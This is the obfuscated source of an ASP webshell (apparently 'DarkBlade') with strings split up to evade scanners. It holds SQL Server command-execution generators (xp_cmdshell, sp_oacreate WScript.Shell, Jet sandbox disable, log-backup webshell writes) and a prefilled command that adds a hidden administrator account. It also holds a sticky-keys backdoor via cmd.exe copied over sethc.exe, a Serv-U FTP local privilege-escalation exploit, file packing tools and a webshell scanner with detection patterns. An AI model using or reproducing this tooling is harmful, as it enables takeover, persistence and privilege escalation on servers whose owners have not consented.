form2.okxlt.value="create table "&bmds&"("&blidh&" nvarchar(4000));bulk insert "&bmds&" from'"&pjoxm&"';delete from "&bmds&" where "&blidh&" is null"
Else
form2.okxlt.value="declare @a int;exec mas"&vci&"ter..sp_oacreate'WScr"&cbsst&"ipt.Sh"&qzwg&"ell',@a output;exec mas"&vci&"ter..sp_oamethod @a,'run',null,'"&gdawv&" > "&pjoxm&"',0,'true'"
End If
End Function
Function ajjin(uylka,xpodw,gicfk,udqqq,amoin,mfolu)
Select Case mfolu
Case 1
form2.okxlt.value="exec mas"&vci&"ter..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFT"&yitz&"WARE\Microsoft\Jet\4.0\Engin"&eazb&"es','SandBox"&mqq&"Mode','REG_DWORD',0"
Case 2
uylka=Replace(uylka,"""","""""")
form2.okxlt.value="Select * From openrow"&vol&"set('Microsoft.Jet.OLEDB.4.0',';Database="&udqqq&"','select shell("""&uylka&" > "&amoin&""")')"
Case 3
form2.okxlt.value="create table "&xpodw&"("&gicfk&" nvarchar(4000));bulk insert "&xpodw&" from'"&amoin&"';delete from "&xpodw&" where "&gicfk&" is null"
End Select
End Function
Function iptg(lht,pxyi)
form2.okxlt.value="declare @a int;exec mas"&vci&"ter..sp_oacreate'Scr"&kpyz&"ipting.FileSystemObje"&jrto&"ct',@a output;exec mas"&vci&"ter..sp_oamethod @a,'CopyFile',null,'"&lht&"','"&pxyi&"'"
End Function
Function wzcu(aefm,dlb)
form2.okxlt.value="Use mas"&vci&"ter;dbcc addextendedp"&oxv&"roc('"&aefm&"','"&dlb&"')"
End Function
Function iblt(wvlb,zniyp,dbname,nwwj)
Select Case nwwj
Case 1
form2.okxlt.value="alter database "&dbname&" set recovery full;dump transaction "&dbname&" with no_log;create table temp(aa varchar(4000)primary key)"
Case 2
form2.okxlt.value="backup database "&dbname&" to disk='C:\windows\temp\8011.tmp' with init"
Case 3
form2.okxlt.value="insert temp values ('"&wvlb&"')"
Case 4
form2.okxlt.value="backup log "&dbname&" to disk='"&zniyp&"'"
End Select
End Function
Function tvaok(dbname)
On Error Resume Next
Dim shb,iwhpp
Set shb=new RegExp
shb.Global=True
shb.IgnoreCase=True
shb.MultiLine=True
shb.Pattern="(Database|Initial Catalog) *=[^;]+"
If shb.test(sqlForm.gdxq.value)Then
sqlForm.gdxq.value=wvxe(shb.Replace(sqlForm.gdxq.value,"$1="&dbname))
sqlForm.wrfse="fyec"
sqlForm.submit
Else
Window.alert("Can not get database name in connect string!")
End If
End Function
</script>
<%
End If
eps"<a href=""javascript:vnkh('fyec','','','','')"">Show Tables</a><br>"
sdy True
bkljo"wrfse","itmu"
bkljo"gdxq",gdxq
gns"100%"
pqot=1
If xelp="mssql"Then
Dim rs
Set rs=phthe("Ad"&lvs&"odb.Record"&msnom&"Set")
rs.Open "select * from mas"&vci&"ter..sysdatabases",conn,1,1
rs.movefirst
las pqot
eps"<td colspan=3>"
Do While Not rs.eof
eps "<a href=javascript:tvaok('"&rs("name")&"')>"&rs("name")&"</a> | "
rs.movenext
Loop
eps"</td></tr>"
nhlnt
End If
las pqot
doTd"Execute Sql","10%"
ldnv"okxlt",okxlt,3
zbja"Submit","10%"
byu
vlpr
ylm
If xelp="mssql"Then
picvp"Functions",True
gns"100%"
las 1
doTd"Xp_CmdShell","10%"
sze"text","ned","net us"&zig&"er Blood"&ngo&"Sword$ 0kee /add & net local"&gem&"group administrators Blood"&ngo&"Sword$ /add","80%","",""
sze"button","","Generate","10%","onClick=""javascript:mgyv(ned.value)""",""
byu
las 0
doTd"Xp_RegRead",""
eps"<td>root : "
sztyg"text","lvdfa","HKEY_LOCAL_MACHINE","30",""
eps" path : "
sztyg"text","znxs","SYSTEM\Current"&fzhwc&"ControlSet\Control\ComputerNa"&egp&"me\ComputerNa"&egp&"me","50",""
eps" key : "
sztyg"text","dlc","ComputerNa"&egp&"me","20",""
eps"</td>"
sze"button","","Generate","","onClick=""javascript:rqie(lvdfa.value,znxs.value,dlc.value)""",""
byu
las 1
doTd"Xp_DirTree",""
sze"text","jjju",ebyut,"","",""
sze"button","","Generate","","onClick=""javascript:omh(jjju.value)""",""
byu
las 0
doTd"Sp_OACreate",""
eps"<td>com"&ztnh&"mand : "
sztyg"text","gdawv","net us"&zig&"er","25",""
eps" table : "
sztyg"text","bmds","temp","10",""
eps" column : "
sztyg"text","blidh","aa","10",""
eps" temp file : "
sztyg"text","pjoxm","C:\WINDOWS\Temp\~098611.tmp","25",""
eps" step"
skuq"ffejg","40px",""
emn 1,1
emn 2,2
lrnz
eps"</td>"
sze"button","","Generate","","onClick=""javascript:rxrxf(gdawv.value,bmds.value,blidh.value,pjoxm.value,ffejg.value)""",""
byu
las 1
doTd"Sandbox Exec",""
eps"<td>com"&ztnh&"mand : "
sztyg"text","uylka","net us"&zig&"er","25",""
eps" table : "
sztyg"text","xpodw","temp","10",""
eps" column : "
sztyg"text","gicfk","aa","10",""
eps" mdb path : "
sztyg"text","udqqq","C:\windows\system"&cutwa&"32\ias\ias.mdb","40",""
eps"<br> temp file :"
sztyg"text","amoin","C:\WINDOWS\Temp\~098611.tmp","40",""
eps" step"
skuq"mfolu","40px",""
emn 1,1
emn 2,2
emn 3,3
lrnz
eps"</td>"
sze"button","","Generate","","onClick=""javascript:ajjin(uylka.value,xpodw.value,gicfk.value,udqqq.value,amoin.value,mfolu.value)""",""
byu
las 0
doTd"FSO Copy",""
eps"<td>source : "
sztyg"text","lht","C:\WINDOWS\system"&cutwa&"32\cmd.exe","40",""
eps" target : "
sztyg"text","pxyi","C:\WINDOWS\system"&cutwa&"32\sethc.exe","40",""
sze"button","","Generate","10%","onClick=""javascript:iptg(lht.value,pxyi.value)""",""
byu
las 1
doTd"Recover Procedure",""
eps"<td>procedure : "
sztyg"text","aefm","xp_cmdshell","40",""
eps" DLL : "
sztyg"text","dlb","xplog"&tzvhy&"70.dll","40",""
sze"button","","Generate","10%","onClick=""javascript:wzcu(aefm.value,dlb.value)""",""
byu
las 0
doTd"Log Backup",""
eps"<td><table width='100%'><tr><td width='50%'>content : "
wvv"wvlb","<%response.clear:execute request(""value""):response.end%"&">","80%",3,""
eps"</td><td width='50%'>path : "
sztyg"text","zniyp",gwbw(".")&"\system.asp","40",""
eps"<br>database : "
sztyg"text","logdb","","20",""
eps" step"
skuq"logstep","40px",""
emn 1,1
emn 2,2
emn 3,3
emn 4,4
lrnz
eps"</td></tr></table></td>"
sze"button","","Generate","10%","onClick=""javascript:iblt(wvlb.value,zniyp.value,logdb.value,logstep.value)""",""
byu
vlpr
eps"</span>"
End If
eps"<hr>"
End If
End Sub
Sub fyec()
Dim cemz,mrph,ifzr,lvf,lxo,bdmk
If Not isDebugMode Then On Error Resume Next
kbc(Err)
lxo=1
pqot=0
Set bdmk=conn.OpenSchema(20,Array(Empty,Empty,Empty,"table"))
kbc(Err)
Do Until bdmk.Eof
adxa lxo
tbqw"<b>"&bdmk("Table_Name")&"</b>"
tbqw"<a href=""javascript:vnkh('itmu','','','"&bdmk("Table_Name")&"','')"">Show content</a>"
tbqw"<a href=""javascript:vnkh('showStructure','','','"&bdmk("Table_Name")&"','')"">Show structure</a>"
If wrfse="showStructure"And simo=bdmk("Table_Name")Then
Set rsColumn=conn.OpenSchema(4, Array(Empty, Empty, bdmk("Table_Name").value))
eps"<span>"
eps"<center>"
gns"80%"
las pqot
nhlnt
doTd"Name","30%"
doTd"Type","30%"
doTd"Size","20%"
doTd"Nullable","20%"
byu
Do Until rsColumn.Eof
ifzr=rsColumn("Character_Maximum_Length")
If ifzr="" Then ifzr=rsColumn("Is_Nullable")
las pqot
doTd rsColumn("Column_Name"),""
doTd xsvx(rsColumn("Data_Type")),""
kgsj ifzr,""
doTd rsColumn("Is_Nullable"),""
byu
nhlnt
rsColumn.MoveNext
Loop
vlpr
eps"</center></span>"
End If
girbw"<br></span>"
nhlnt
lxo=lxo+1
If lxo=2 Then lxo=0
bdmk.MoveNext
Loop
Set bdmk=Nothing
Set rsColumn=Nothing
afqj(Err)
End Sub
Sub itmu()
Dim i,j,x,rs,Cat,ukq,iqflg,fkvo,zamc
If Not isDebugMode Then On Error Resume Next
Set Cat=phthe("ADOX.Catalog")
Cat.ActiveConnection=conn.ConnectionString
Set rs=phthe("Ad"&lvs&"odb.Record"&msnom&"Set")
If LCase(Left(okxlt,7))="select "Then
If funx=""Then funx=1
rs.Open okxlt,conn,1,1
kbc(Err)
funx=CInt(funx)
rs.PageSize=sqlPageSize
If Not rs.Eof Then
rs.AbsolutePage=funx
End If
If rs.Fields.Count > 0 Then
'gns"100%"
eps"<table width='100%' cellspacing='0' border='0' style='border-width:0px;border-collapse:collapse;'>"
las 1
For j=0 To rs.Fields.Count-1
svznk HtmlEncode(rs.Fields(j).Name)
Next
byu
pqot=0
For i=1 To rs.PageSize
If rs.Eof Then Exit For
las pqot
For j=0 To rs.Fields.Count-1
svznk HtmlEncode(rs(j))
Next
byu
nhlnt
rs.MoveNext
Next
End If
las pqot
fkvo=rs.RecordCount/sqlPageSize
If InStr(fkvo,".")>0 Then fkvo=Int(fkvo)+1
eps"<td colspan="&rs.Fields.Count&">"
girbw rs.RecordCount&" records in total,page "&fkvo
eps"<a href=""javascript:vnkh('itmu','','','"&simo&"',1)"">&laquo;</a>"&HtmlEncode(" ")
zamc=""
If simo=""Then zamc=okxlt
For i=1 To fkvo
If i=funx Then
eps HtmlEncode(" "&i&" ")
Else
eps HtmlEncode(" ")&"<a href=""javascript:vnkh('itmu','','"&zamc&"','"&simo&"',"&i&")"">"&i&"</a> "&HtmlEncode(" ")
End If
Next
eps HtmlEncode(" ")&"<a href=""javascript:vnkh('itmu','','"&zamc&"','"&simo&"',"&fkvo&")"">&raquo;</a>"
eps"</td>"
byu
vlpr
rs.Close
 Else
Set rs=conn.Execute(okxlt,-1,&H0001)
kbc(Err)
If rs.Fields.Count>0 Then
gns"100%"
las 1
For i=0 To rs.Fields.Count-1
svznk HtmlEncode(rs.Fields(i).Name)
Next
byu
pqot=0
Do Until rs.EOF
las pqot
For i=0 To rs.Fields.Count-1
svznk HtmlEncode(rs(i))
Next
byu
rs.MoveNext
nhlnt
Loop
vlpr
Else
sqvg"Query got null recordset."
End If
Set rs=Nothing
Set Cat=Nothing
End If
afqj(Err)
End Sub
Sub fcmwc(gdxq)
If Not isDebugMode Then On Error Resume Next
Set conn=phthe("Ad"&lvs&"odb.Connect"&tzf&"ion")
conn.Open gdxq
kbc(Err)
End Sub
Sub kbqxz()
If Not isDebugMode Then On Error Resume Next
If IsObject(conn)Then
conn.Close
Set conn=Nothing
End If
End Sub
Function xsvx(flag)
Dim str
Select Case flag
Case 0str="EMPTY"
Case 2: str="SMALLINT"
Case 3: str="INTEGER"
Case 4: str="SINGLE"
Case 5: str="DOUBLE"
Case 6: str="CURRENCY"
Case 7: str="DATE"
Case 8: str="BSTR"
Case 9: str="IDISPATCH"
Case 10: str="ERROR"
Case 11: str="BIT"
Case 12: str="VARIANT"
Case 13: str="IUNKNOWN"
Case 14: str="DECIMAL"
Case 16: str="TINYINT"
Case 17: str="UNSIGNEDTINYINT"
Case 18: str="UNSIGNEDSMALLINT"
Case 19: str="UNSIGNEDINT"
Case 20: str="BIGINT"
Case 21: str="UNSIGNEDBIGINT"
Case 72: str="GUID"
Case 128: str="BINARY"
Case 129: str="CHAR"
Case 130: str="WCHAR"
Case 131: str="NUMERIC"
Case 132: str="USERDEFINED"
Case 133: str="DBDATE"
Case 134: str="DBTIME"
Case 135: str="DBTIMESTAMP"
Case 136: str="CHAPTER"
Case 200: str="VARCHAR"
Case 201: str="TEXT"
Case 202: str="NVARCHAR"
Case 203: str="NTEXT"
Case 204: str="VARBINARY"
Case 205: str="LONGVARBINARY"
Case Else: str=flag
End Select
xsvx=str
End Function
Sub kdl()
If Not isDebugMode Then On Error Resume Next
Dim theFile,medgl,qfaqh,fonbn
If Right(pccem,1)="\"Then
sqvg"Can't edit a directory!"
smeb
End If
qfaqh=zznke(pccem,"\",False)
sdy True
If goaction="unv"And wrfse="kdl" Then
medgl=nvxs(pccem)
Else
medgl=qea(pccem)
End If
afqj(Err)
wvv"gvr",medgl,"100%","25",""
If wrfse="eoxxk" Then
bkljo"wrfse","pus"
Else
bkljo"wrfse","save"
End If
eps"Save as :"
sztyg"text","pccem",pccem,"60",""
eps" Encode:"
skuq"act","80px","onchange=""javascript:if(this.value!=''){uivh('"&goaction&"',this.value,'"&rdeb(pccem)&"');}"""
emn"kdl","Default"
fonbn="<option value=""eoxxk"" {$}>Utf-8</option>"
If wrfse="eoxxk" Then
fonbn=Replace(fonbn,"{$}","selected")
End If
eps fonbn
lrnz
eps" "
uivh"Save"
eps" "
sztyg"reset","","Reset","",""
eps" "
sztyg"button","clear","Clear","","onclick=""javascript:this.form.gvr.innerText=''"""
eps" "
sztyg"button","","Go back","","onclick=""javascript:uivh('"&goaction&"','','"&rdeb(qfaqh)&"')"""
ylm
afqj(Err)
smeb
End Sub
Sub gccb()
If Not isDebugMode Then On Error Resume Next
If goaction="unv"And wrfse="save" Then
kwys pccem,gvr
Else
xww pccem,gvr
End If
If Err Then
afqj(Err)
Else
sqvg"File saved."
End If
End Sub
Sub ubi()
If Not isDebugMode Then On Error Resume Next
Server.ScriptTimeOut=5000
If pccem=""Then pccem=kwnoj
If pccem=""Then pccem=ebyut
If wfc=""Then wfc=gwbw("Dar"&sevw&"kBlade.mdb")
If gtttu=""Then gtttu="fso"
swz"File Packer/Unpacker"
eps"<center>"
gns"100%"
las 1
sdy True
doTd"File Pack","10%"
sze"text","pccem",pccem,"30%","",""
girbw"<td style=""width:50%;"">"
skuq"wrfse","80px",""
emn"zkaeh","FSO"
emn"xafp","UnFSO"
lrnz
eps" Pack as : "
sztyg"text","wfc",wfc,40,""
eps"</td>"
zbja"Pack","10%"
byu
las 0
doTd"Exceptional folder",""
sze"text","sru",sru,"30%","",""
eps"<td colspan=""2"">"
eps"Exceptional file type,split with | "
sztyg"text","bwl",bwl,40,""
eps"</td></tr>"
vlpr
ylm
eps"<hr>"
gns"100%"
las 1
sdy True
bkljo"wrfse","dyo"
doTd"Release to","10%"
sze"text","pccem",pccem,"30%","",""
girbw"<td> Mdb path : "
sztyg"text","wfc",wfc,40,""
eps"</td>"
zbja"Unpack","10%"
ylm
byu
vlpr
eps"</center>"
eps"<hr>Notice: Unpacking need FSO object,all files unpaed will be under target folder,replacing same named!"
Select Case wrfse
Case"zkaeh"
nuwf"fso"
Case"xafp"
nuwf"app"
Case"dyo"
rre()
End Select
End Sub
Sub nuwf(gtttu)
If Not isDebugMode Then On Error Resume Next
Dim rs,bncj,gdxq,nrrf
Set rs=phthe("Ad"&lvs&"odb.Record"&msnom&"Set")
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
Set nrrf=phthe("ADOX.Catalog")
If InStr(wfc,":\")<1 Then wfc=gwbw(wfc)
lginb=pfwku(wfc,".+\\","",False)
gdxq=fne(wfc)
nrrf.Create gdxq
fcmwc(gdxq)
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)")
kbc Err
bncj.Open
bncj.Type=1
rs.Open"FileData",conn,3,3
lginb=LCase(lginb)
yyzk=Replace(lginb,".mdb",".ldb")
If gtttu="fso"Then
edgli pccem,pccem,rs,bncj
Else
fzqhu pccem,pccem,rs,bncj
End If
rs.Close
kbqxz
bncj.Close
Set rs=Nothing
Set bncj=Nothing
Set nrrf=Nothing
If Err Then
afqj(Err)
Else
sqvg"Packing completed"
End If
End Sub
Sub edgli(pccem,ckxz,rs,bncj)
If Not isDebugMode Then On Error Resume Next
Dim ogdaw,theFolder,dieec,files
If Not(tyz.FolderExists(ckxz))Then
sqvg"Folder dosen't exists or access denied!"
smeb
End If
sru=LCase(sru)
Set theFolder=tyz.GetFolder(ckxz)
For Each ogdaw In theFolder.Files
If Not (rhk(tqml(ogdaw.name,"."),"^("&bwl&")$") Or LCase(ogdaw.Name)=lginb Or LCase(ogdaw.Name)=yyzk)Then
rs.AddNew
rs("strPath")=pfwku(ogdaw.Path,pccem&"\","",True)
Execute "bncj.Loa"&nnbzt&"dFromFile(ogdaw.Path)"
rs("binContent")=bncj.Read()
rs.Update
End If
Next
For Each ogdaw In theFolder.SubFolders
If Not rhk(ogdaw.name,"^("&sru&")$")Then
edgli pccem,ogdaw.Path,rs,bncj
End If
Next
Set files=Nothing
Set dieec=Nothing
Set theFolder=Nothing
End Sub
Sub fzqhu(pccem,ckxz,rs,bncj)
If Not isDebugMode Then On Error Resume Next
Dim ogdaw,theFolder,awil
Execute "Set theFolder=aeh.Nam"&lszdq&"eSpace(ckxz)"
For Each ogdaw In theFolder.Items
If Not ogdaw.IsFolder And LCase(ogdaw.Name)<>lginb And LCase(ogdaw.Name)<>yyzk And Not (rhk(tqml(ogdaw.name,"."),"^("&bwl&")$"))  Then
rs.AddNew
rs("strPath")=pfwku(ogdaw.Path,pccem&"\","",True)
Execute "bncj.Loa"&nnbzt&"dFromFile(ogdaw.Path)"
rs("binContent")=bncj.Read()
rs.Update
End If
Next
For Each ogdaw In theFolder.Items
If ogdaw.IsFolder And Not rhk(ogdaw.name,"^("&sru&")$") Then
fzqhu pccem,ogdaw.Path,rs,bncj
End If
Next
Set theFolder=Nothing
End Sub
Sub rre()
If Not isDebugMode Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim rs,str,bncj,theFolder
pccem=pccem
pccem=Replace(pccem,"\\","\")
If InStr(wfc,":\")<1 Then wfc=gwbw(wfc)
Set rs=phthe("Ad"&lvs&"odb.Record"&msnom&"Set")
Set bncj=phthe("Ad"&lvs&"odb.S"&lwn&"tream")
gdxq=fne(wfc)
fcmwc(gdxq)
rs.Open"FileData",conn,1,1
kbc Err
bncj.Open
bncj.Type=1
Do Until rs.Eof
If InStr(rs("strPath"),"\")>0 Then
theFolder=pccem&"\"&zznke(rs("strPath"),"\",False)
Else
theFolder=pccem
End If
If Not tyz.FolderExists(theFolder)Then
Execute "tyz.CreateFo"&zdfxw&"lder(theFolder)"
End If
bncj.SetEos()
bncj.Write rs("binContent")
Execute "bncj.Sav"&mhxoc&"etoFile pccem&""\""&rs(""strPath""),2"
rs.MoveNext
Loop
rs.Close
kbqxz
bncj.Close
Set rs=Nothing
Set bncj=Nothing
If Err Then
afqj(Err)
Else
sqvg"Unpacking completed"
End If
End Sub
Sub ksf()
If Not isDebugMode Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim theFolder
swz("Text File Searcher/Replacer")
If pccem=""Then
pccem=nycqm
End If
sdy True
gns"100%"
las 1
doTd"Keyword","20%"
ldnv"nsp",nsp,4
eps"<td>"
skuq"wrfse","80px",""
emn"fsoSearch","FSO"
emn"saSearch","UnFSO"
lrnz
eps"<br>"
sztyg"checkbox","rgop",1,"",""
girbw" Regexp</td>"
byu
las 0
doTd"Replace as",""
ldnv"ycpoe",ycpoe,4
eps"<td>"
sztyg"checkbox","lcb",1,"",""
girbw"Replace</td>"
byu
las 1
doTd"Path",""
sze"text","pccem",pccem,"","",""
eps"<td>"
sztyg"radio","searchType","filename","",""
eps"File name "
sztyg"radio","searchType","gvr","","checked"
eps"File content"
eps"</td>"
byu
las 0
doTd"Search type",""
sze"text","nxfic",textExt,"","",""
zbja"Search",""
byu
vlpr
If nsp<>""Then
eps"<hr>"
fsuo
If wrfse="fsoSearch"Then
Set theFolder=tyz.GetFolder(pccem)
Call bgew(theFolder,nsp)
Set theFolder=Nothing
ElseIf wrfse="saSearch"Then
Call alr(pccem,nsp)
End If
eps"</ul>"
End If
If Err Then
afqj(Err)
Else
sqvg"Search completed"
End If
smeb
End Sub
Sub bgew(folder,str)
Dim ext,title,theFile,theFolder,mnx
mnx=False
If rgop=1 Then mnx=True
For Each theFile In folder.Files
ext=LCase(tqml(theFile.Name,"."))
If searchType="filename"Then
If mnx And rhk(theFile.Name,str)Then
ctu theFile.Path,"fso"
ElseIf InStr(1,theFile.Name,str,1) > 0 Then
ctu theFile.Path,"fso"
End If
Else
If rhk(ext,"^("&nxfic&")$")Then
If nlfxu(theFile.Path,str,"fso",mnx) Then
ctu theFile.Path,"fso"
End If
End If
End If
Next
For Each theFolder In folder.subFolders
bgew theFolder,str
Next
afqj(Err)
End Sub
Function nlfxu(ywoa,s,method,mnx)
If Not isDebugMode Then On Error Resume Next
Dim theFile,content,qzayd
qzayd=False
If method="fso" Then
content=nvxs(ywoa)
Else
content=qea(ywoa)
End If
If Err Then
afqj(Err)
nlfxu=False
Exit Function
End If
If mnx Then
qzayd=rhk(content,s)
ElseIf InStr(1,content,s,1)>0 Then
qzayd=True
End If
If lcb Then
If mnx Then
content=pfwku(content,s,ycpoe,False)
Else
content=Replace(content,s,ycpoe,1,-1,1)
End If
If method="fso" Then
kwys ywoa,content
Else
xww ywoa,content
End If
End If
nlfxu=qzayd
afqj(Err)
End Function
Sub alr(pccem,mfyvs)
If Not isDebugMode Then On Error Resume Next
Dim title,ext,dieec,fvz,fileName,mnx
mnx=False
If rgop=1 Then mnx=True
Execute "Set dieec=aeh.Nam"&jmed&"eSpace(pccem)"
For Each fvz In dieec.Items
If fvz.IsFolder Then
Call alr(fvz.Path,mfyvs)
Else
ext=LCase(tqml(fvz.Path,"."))
fileName=tqml(fvz.Path,"\")
If searchType="filename"Then
If mnx And rhk(fileName,str)Then
ctu theFile.Path,"app"
ElseIf InStr(LCase(fileName),LCase(str)) > 0 Then
ctu theFile.Path,"app"
End If
Else
If rhk(subExt,"^("&nxfic&")$")Then
If nlfxu(fvz.Path,mfyvs,"app",mnx) Then
ctu fvz.Path,"app"
End If
End If
End If
End If
Next
afqj(Err)
End Sub
Sub ctu(ywoa,qwse)
Dim lkzrc
If qwse="fso"Then
lkzrc="unv"
Else
lkzrc="cfh"
End If
eps"<li><u>"&ywoa&"</u>"
eps"<a href=""javascript:uivh('"&lkzrc&"','kdl','"&rdeb(ywoa)&"')"">Edit</a>"
Response.Flush()
End Sub
Sub rby()
If Not isDebugMode Then On Error Resume Next
Dim mgjnb
svl="60000"
mgjnb="Dar"&sevw&"kBlade"
dzlc="User "&ojn&vbCrLf
yaj="Pass "&vbv&vbCrLf
yir="-DELET"&kori&"EDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&svl&vbCrLf
mt="SITE MAI"&pzhj&"NTENANCE"&vbCrLf
eef="-SE"&lfwma&"TDOMAIN"&vbCrLf&"-Domain="&mgjnb&"|0.0.0.0|"&svl&"|-1|1|0"&vbCrLf&"-TZO"&tgtuq&"Enable=0"&vbCrLf&" TZOKey="&vbCrLf
rjvjh="-SET"&lnwgb&"USERSETUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&svl&vbCrLf&"-User=go"&vbCrLf&"-Password=od"&vbCrLf&_
"-HomeDir="&btsvz()&"\\"&vbCrLf&"-LoginMesFi"&afo&"le="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPa"&sdwdi&"ths=1"&vbCrLf&_
"-NeedSec"&btej&"ure=0"&vbCrLf&"-HideHi"&uog&"dden=0"&vbCrLf&"-AlwaysAllowLo"&onfb&"gin=0"&vbCrLf&"-Chan"&sobl&"gePassword=0"&vbCrLf&_
"-QuotaEn"&xms&"able=0"&vbCrLf&"-MaxUsersLoginPe"&evi&"rIP=-1"&vbCrLf&"-Speed"&qvsz&"LimitUp=0"&vbCrLf&"-Spe"&xxnqt&"edLimitDown=0"&vbCrLf&_
"-Max"&zsckm&"NrUsers=-1"&vbCrLf&"-IdleTim"&sgc&"eOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAI"&pzhj&"NTENANCE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&btsvz()&"\\|RWA"&yyzi&"MELCDP"&vbCrLf
tqnx="tqnx"&vbCrLf
swz("Serv"&dwtpl&"-U FTP Exp")
Select Case wrfse
Case "1"
ndk
Case "2"
jrhmi
Case "3"
cnd
Case Else
set a=session("a")
set b=session("b")
set c=session("c")
If IsObject(a)Then a.abort
If IsObject(b)Then b.abort
If IsObject(c)Then c.abort
Set a=Nothing
Set b=Nothing
Set c=Nothing
Set session("a")=Nothing
Set session("b")=Nothing
Set session("c")=Nothing
sdy True
bkljo "wrfse",1
eps"<center>"
gns "80%"
las 1
doTd"Ftp user","20%"
sze"text","ojn","LocalAdmin"&pjb&"istrator","30%","",""
doTd"Ftp pass","20%"
sze"text","vbv","#l@$ak#.lk;0@P","30%","",""
byu
las 0
doTd"Ftp port",""
sze"text","iojk","439"&zqcgg&"58","","",""
doTd"Sys drive",""
sze"text","nyfm",btsvz(),"","",""
byu
las 1
doTd"com"&ztnh&"mand",""
sze"text","mtidt","cmd /c net us"&zig&"er Blood"&ngo&"Sword$ 0kee /add & net local"&gem&"group administrators Blood"&ngo&"Sword$ /add","","",2
eps"<td>"
uivh"Submit"
sztyg"reset","","Reset","",""
eps"</td></tr>"
vlpr
eps"</center>"
ylm
smeb
End Select
End Sub
Sub ndk()
If Not isDebugMode Then On Error Resume Next
set a=phthe("Microsoft.X"&xnp&"MLHTTP")
a.open"GET","http://127.0.0.1:"&iojk&"/goldsun/upadm"&qvtl&"in/s1",True,"",""
a.send dzlc&yaj&mt&yir&eef&rjvjh&tqnx
Set session("a")=a
sdy True
bkljo"wrfse",2
bkljo"ojn",ojn
bkljo"vbv",vbv
bkljo"iojk",iojk
bkljo"nyfm",nyfm
bkljo"mtidt",mtidt
ylm
eps"<center>Connecting 127.0.0.1:"&iojk&" using "&ojn&",pass:"&vbv&"...</center>"
%>
<script language="javascript">
setTimeout("form1.submit()",4000);
</script>
<%
End Sub
Sub jrhmi()
If Not isDebugMode Then On Error Resume Next
Set b=phthe("Microsoft.X"&xnp&"MLHTTP")
b.open"GET","http://127.0.0.1:"&svl&"/goldsun/upadm"&qvtl&"in/s2",True,"",""
b.send"User go"&vbCrLf&"pass od"&vbCrLf&"site exec "&mtidt&vbCrLf&tqnx
Set session("b")=b
sdy True
bkljo"wrfse",3
bkljo"ojn",ojn
bkljo"vbv",vbv
bkljo"iojk",iojk
bkljo"nyfm",nyfm
bkljo"mtidt",mtidt
ylm
eps"<center>Executing com"&ztnh&"mand...</center>"
%>
<script language="javascript">
setTimeout('form1.submit()',4000);
</script>
<%
End Sub
Sub cnd()
If Not isDebugMode Then On Error Resume Next
Set c=phthe("Microsoft.X"&xnp&"MLHTTP")
c.open"GET","http://127.0.0.1:"&iojk&"/goldsun/upadm"&qvtl&"in/s3",True,"",""
c.send dzlc&yaj&mt&yir&tqnx
Set session("c")=c
eps"<center>Exploit completed,com"&ztnh&"mand has been executed:<br><font color=red>"&mtidt&"</font><br>"
sztyg "button","","Get back","","onClick=""javascript:uivh('"&goaction&"','','')"""
eps"</center>"
End Sub
Function btsvz()
If Not isDebugMode Then On Error Resume Next
btsvz=LCase(Left(tyz.GetSpecialFolder(0),2))
If btsvz=""Then btsvz="c:"
End Function
Sub fuo()
If Not isDebugMode Then On Error Resume Next
Dim theFolder
swz"Asp Webshell Scanner"
eps"Path : "
sdy True
sztyg"text","pccem","/",50,""
eps" "
uivh"Scan"
sztyg"checkbox","jxi",1,"",""
eps" Get include files"
If pccem<>""Then
If InStr(pccem,":\")<1 Then pccem=gwbw(pccem)
eps"<hr>"
Response.Flush()
fsuo
Set theFolder=tyz.GetFolder(pccem)
znxg(theFolder)
Set theFolder=Nothing
eps"</ul>"
End If
smeb
End Sub
Sub znxg(theFolder)
If Not isDebugMode Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim lylyz,uwevh,ext,llw,zwt,nfc,wlgu,theFile,content,bwzb
lylyz="WScr"&cbsst&"ipt.Sh"&qzwg&"ell|WScr"&cbsst&"ipt.She"&njsg&"ll.1|She"&njsg&"ll.A"&gpb&"pplication|She"&njsg&"ll.A"&gpb&"pplication.1|clsid:72C24"&gjl&"DD5-D70A-438B-8A42-98424"&rzpu&"B88AFB8|clsid:137"&rbhd&"09620-C279-11CE-A49E-444553540"&vce&"000"
uwevh="WScr"&cbsst&"ipt.Sh"&qzwg&"ell;Run,Exec,RegRead|She"&njsg&"ll.A"&gpb&"pplication;Shel"&lnhm&"lExecute|Scr"&kpyz&"ipting.FileSystemObje"&jrto&"ct;CreateTextFile,OpenTextFile"
For Each wrtc In theFolder.Files
bwzb=False
nfc=False
ext=LCase(tqml(wrtc.Name,"."))
If rhk(ext,"^("&aspExt&")$") Then
content=nvxs(wrtc.Path)
wlgu=""
For Each ttrwh In Split(lylyz,"|")
If InStr(1,content,ttrwh,1)>0 Then
tfgd wrtc,"Object with risk : <font color=""red"">"&ttrwh&"</font>"
bwzb=True
End If
Next
For Each strFunc In Split(uwevh,"|")
llw=zznke(strFunc,";",True)
zwt=tqml(strFunc,";")
For Each subFunc In Split(zwt,",")
 If rhk(content,"\."&subFunc&"\b") Then
tfgd wrtc,"Called object <font color=""red"">"&llw&"'s "&subFunc&"</font> function"
bwzb=True
End If
Next
Next
If rhk(content,"set\s*.*\s*=\s*server\s")Then
tfgd wrtc,"Found Set xxx=Server"
bwzb=True
End If
If rhk(content,"server.(execute|Transfer)([ \t]*|\()[^""]\)")Then
tfgd wrtc,"Found <font color=""red"">Ser"&jza&"ver.Execute / Transfer()</font> function"
bwzb=True
End If
If rhk(content,"\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b")Then
